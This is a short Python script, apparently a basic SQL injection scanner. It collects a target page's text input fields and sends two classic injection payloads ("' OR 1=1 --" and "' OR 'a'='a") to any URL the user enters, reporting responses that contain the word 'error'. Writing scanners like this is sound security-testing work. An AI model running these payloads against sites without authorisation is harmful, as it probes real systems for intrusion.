import requests
from bs4 import BeautifulSoup

# Function to detect SQL Injection vulnerabilities
def detect_sql_injection(url):
    try:
        # Send a GET request to the target URL
        response = requests.get(url)

        # Check if the response status code indicates a successful request (e.g., 200 OK)
        if response.status_code == 200:
            # Parse the HTML content of the response
            soup = BeautifulSoup(response.text, 'html.parser')

            # Extract input fields from the HTML form (customize as needed)
            input_fields = soup.find_all('input', {'type': 'text'})

            # Payloads for SQL Injection testing (customize as needed)
            payloads = ["' OR 1=1 --", "' OR 'a'='a"]

            # Loop through input fields and test payloads
            for field in input_fields:
                field_name = field.get('name')
                if field_name:
                    for payload in payloads:
                        # Construct a request with the payload
                        data = {field_name: payload}
                        response_with_payload = requests.get(url, params=data)

                        # Check if the response indicates a successful SQLi attack
                        if "error" in response_with_payload.text.lower():
                            print(f"Potential SQL Injection vulnerability detected in input field '{field_name}' with payload: {payload}")

        else:
            print(f"Failed to retrieve data from {url}. Status code: {response.status_code}")

    except Exception as e:
        print(f"An error occurred: {str(e)}")

if __name__ == "__main__":
    target_url = input("Enter the URL of the web application to scan for SQL Injection: ")
    detect_sql_injection(target_url)
